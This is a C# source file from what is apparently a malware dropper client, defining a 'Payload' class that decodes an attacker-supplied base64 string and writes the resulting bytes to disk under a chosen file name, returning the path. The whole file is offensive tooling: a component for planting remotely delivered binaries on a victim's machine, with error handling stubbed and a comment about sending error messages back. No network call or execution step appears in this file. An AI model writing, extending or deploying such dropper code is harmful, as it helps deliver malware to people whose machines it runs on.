using System;
using System.IO;

namespace DropperClient.Command
{
    internal class Payload
    {
        private byte[] PayloadBytes { get; set; }

        private string FileName { get; set; }

        /// <summary>
        /// Drops the Payload to the disk
        /// </summary>
        /// <returns></returns>
        public string Drop()
        {
            try
            {
                File.WriteAllBytes("./" + FileName, PayloadBytes);
            }
            catch (IOException ioex)
            {
                // Handle error, prolly send errormessages back
                return null;
            }
            catch (Exception ex)
            {
                // Handle error, prolly send errormessages back
                return null;
            }

            if (File.Exists("./" + FileName))
            {
                var f = new FileInfo(FileName);
                return f.FullName;
            }
            else
            {
                return null;
            }
        }

        /// <summary>
        /// Sets the Payload
        /// </summary>
        /// <param name="base64string">String to decode the bytes from</param>
        /// <returns></returns>
        public bool SetPayload(string base64string)
        {
            try
            {
                PayloadBytes = Convert.FromBase64String(base64string);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Sets the payload's filename
        /// </summary>
        /// <param name="name"></param>
        public void SetFileName(string name)
        {
            FileName = name;
        }
    }
}